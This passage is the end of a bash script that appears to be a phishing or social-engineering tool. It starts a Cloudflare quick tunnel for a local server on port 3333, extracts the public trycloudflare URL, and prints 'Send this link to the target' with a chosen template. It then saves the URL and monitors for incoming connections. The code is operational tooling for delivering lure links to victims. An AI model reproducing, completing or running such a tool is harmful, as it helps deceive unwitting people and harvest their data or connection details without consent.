    cloudflared_url=$(grep -o 'https://[^ ]*' cloudflared.log 2>/dev/null | grep trycloudflare | head -1)
  fi
  
  # If still no URL, check if cloudflared is running
  if [[ -z "$cloudflared_url" ]]; then
    if ps -p $CLOUDFLARED_PID > /dev/null; then
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cloudflared is running but URL not found in logs.\e[0m\n"
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Checking cloudflared.log file manually...\e[0m\n"
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Last 10 lines of cloudflared.log:\e[0m\n"
      tail -10 cloudflared.log
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Enter the Cloudflared URL manually: \e[0m"
      read cloudflared_url
    else
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Cloudflared failed to start. Check cloudflared.log for details.\e[0m\n"
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] You can view the log with: cat cloudflared.log\e[0m\n"
      exit 1
    fi
  fi
  
  # Clean up the URL
  cloudflared_url=$(echo "$cloudflared_url" | tr -d '[:space:]')
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared tunnel established!\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Template: \e[0m\e[1;93m$template\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Send this link to the target: \e[0m\e[1;77m%s\e[0m\n" "$cloudflared_url"
  
  # Also show the local URL
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Local URL: \e[0m\e[1;77mhttp://localhost:3333\e[0m\n"
  
  # Save the URL to a file for reference
  echo "Template: $template" > cloudflared_url.txt
  echo "URL: $cloudflared_url" >> cloudflared_url.txt
  echo "Generated: $(date)" >> cloudflared_url.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] URL saved to cloudflared_url.txt\e[0m\n"
  
  # Start monitoring for connections
  checkfound
}

# Main execution
clear
banner
check_dependencies
select_template
install_cloudflared
start_servers